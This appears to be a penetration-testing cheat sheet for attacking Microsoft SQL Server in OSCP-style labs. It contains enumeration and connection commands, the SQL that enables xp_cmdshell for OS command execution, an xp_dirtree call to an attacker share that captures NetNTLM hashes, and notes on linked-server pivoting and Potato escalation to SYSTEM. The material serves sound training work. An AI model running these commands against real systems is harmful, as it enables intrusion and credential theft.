# Notes — MSSQL (1433)

> Authorized lab/OSCP use only.

## What it is
Microsoft SQL Server. High-value: weak `sa` credentials, `xp_cmdshell` command execution, and credential relay/impersonation.

## Enumeration
```bash
nmap -sC -sV -p1433 $IP
nmap --script "ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password" -p1433 $IP
```

## Connect
```bash
# Impacket (SQL or Windows auth)
mssqlclient.py user:pass@$IP
mssqlclient.py user:pass@$IP -windows-auth

# sqsh
sqsh -S $IP -U sa -P pass
```

## Useful in-session commands
```sql
SELECT @@version;
SELECT name FROM sys.databases;
EXEC sp_databases;
-- enable + use xp_cmdshell (command execution)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

In `mssqlclient.py` you can also use the built-in helpers: `enable_xp_cmdshell`, then `xp_cmdshell whoami`.

## Attack ideas
| Technique | Note |
|-----------|------|
| `xp_cmdshell` | Direct OS command exec (often SYSTEM/service acct) |
| `xp_dirtree \\attacker\share` | Force NetNTLM auth → capture with Responder/`ntlmrelayx` |
| Linked servers | `EXEC sp_linkedservers` → pivot/impersonate |
| `EXECUTE AS LOGIN` | Privilege escalation inside SQL |

## Common Mistakes
- Not trying `sa` with blank/weak passwords.
- Forgetting to enable advanced options before `xp_cmdshell`.
- Overlooking `xp_dirtree` hash-capture when direct exec is blocked.

## OSCP Tips
- `xp_cmdshell` often runs as the SQL service account with `SeImpersonate` → Potato privesc to SYSTEM.
- Capture-and-relay via `xp_dirtree` is a reliable fallback.
